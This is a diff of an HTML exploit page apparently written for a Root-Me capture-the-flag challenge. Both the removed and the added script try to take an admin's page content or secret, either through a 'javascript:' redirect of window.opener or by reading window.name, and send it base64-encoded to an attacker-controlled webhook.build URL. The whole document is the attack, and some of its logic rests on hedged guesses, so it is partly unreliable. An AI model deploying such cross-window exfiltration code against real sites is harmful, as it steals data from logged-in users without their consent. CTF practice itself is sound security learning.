@@ -2,25 +2,25 @@
 <html>
 <body>
     <script>
-        if (window.opener) {
-            // We can't READ the admin's page, but we can REDIRECT it.
-            // We redirect the admin's original tab to YOUR webhook.
-            // Because the admin is already logged in, the browser 
-            // might send sensitive data in the Referer header or 
-            // we can try to trigger a 'javascript:' execution on the opener.
-            
-            try {
-                // This attempts to force the admin's original tab to 
-                // execute a script that sends its own content to you.
-                window.opener.location = "javascript:fetch('https://webhook.build/api/webhook/1ebfbe39-d596-4e8c-b261-3b05cbfe9b45?data=' + btoa(document.body.innerText))";
-            } catch (e) {
-                // If the browser blocks the 'javascript:' redirect, 
-                // we redirect them to a page where the URL itself 
-                // might leak the secret if it's stored in the fragment.
-                window.opener.location = "https://webhook.build/api/webhook/1ebfbe39-d596-4e8c-b261-3b05cbfe9b45?leak=failed_js_redirect";
+        // 1. We open the challenge profile.
+        // 2. This new window's 'opener' is OUR page.
+        const win = window.open('http://challenge01.root-me.org:58003/profile');
+
+        // 3. We wait for the admin's page to load.
+        setTimeout(() => {
+            // 4. Since we can't read 'win.document', we check if the 
+            // secret was placed into the 'window.name' of the opened window.
+            // In many challenges, the admin's secret IS the window name.
+            const secret = win.name;
+
+            if (secret) {
+                fetch('https://webhook.build/api/webhook/1ebfbe39-d596-4e8c-b261-3b05cbfe9b45?secret=' + btoa(secret));
+            } else {
+                // 5. If that fails, the secret might be in the OPENER'S name.
+                // We redirect the admin's window to OUR webhook.
+                win.location = 'https://webhook.build/api/webhook/1ebfbe39-d596-4e8c-b261-3b05cbfe9b45?info=redirected';
             }
-        }
+        }, 2000);
     </script>
-    <h1>Exploit active... check your webhook.</h1>
 </body>
 </html>
